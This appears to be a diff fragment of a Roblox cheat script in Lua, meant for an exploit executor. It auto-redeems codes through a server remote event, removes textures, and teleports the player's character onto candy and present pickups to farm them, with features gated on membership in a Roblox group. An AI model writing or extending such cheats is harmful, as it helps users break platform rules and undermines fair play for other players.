+        local A_1 = "cookie"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "gravy"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "raven"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "razor"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "robzi"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "subtoaustin"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "release"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "mirrors"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "henrydev"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "mmistaken"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+    end)
+end
+
+
+function removetexture()
+    spawn(function()
+        for _,v in pairs(workspace:GetDescendants()) do
+            if v.ClassName == "Part"
+                or v.ClassName == "SpawnLocation"
+                or v.ClassName == "WedgePart"
+                or v.ClassName == "Terrain"
+                or v.ClassName == "MeshPart" then
+                v.BrickColor = BrickColor.new(155, 155, 155)
+                v.Material = "Plastic"
+            end
+        end
+    end)
+end
+
+
+function autocandy()
+    spawn(function()
+        game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.Text = "This shit is fixed :)"
+        task.wait(2)
+        game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.Text = ""
+    end)
+    
+    
+    spawn(function()
+        while getgenv().candy do
+            pcall(function()
+            for i,v in pairs(game:GetService("Workspace").CandyHolder:GetDescendants()) do
+                if v.Name == "CandyCane" or v.Name == "Present"  then
+                if v.Transparency == 0 then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
+                else
+                end
+                end
+                end
+                end)
+            task.wait(0.5)
+        end
+    end)
+end
+
+else	
+game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.Text = "Please join \n www.roblox.com/groups/8939440/SenpaiChou to verify yourself \n if you want any help join discord.gg/FhzbB7hXGr"
+--game:service('Players').LocalPlayer:Kick('Please join www.roblox.com/groups/8939440/SenpaiChou to verify yourself or if you want any help join discord.gg/FhzbB7hXGr')
+end
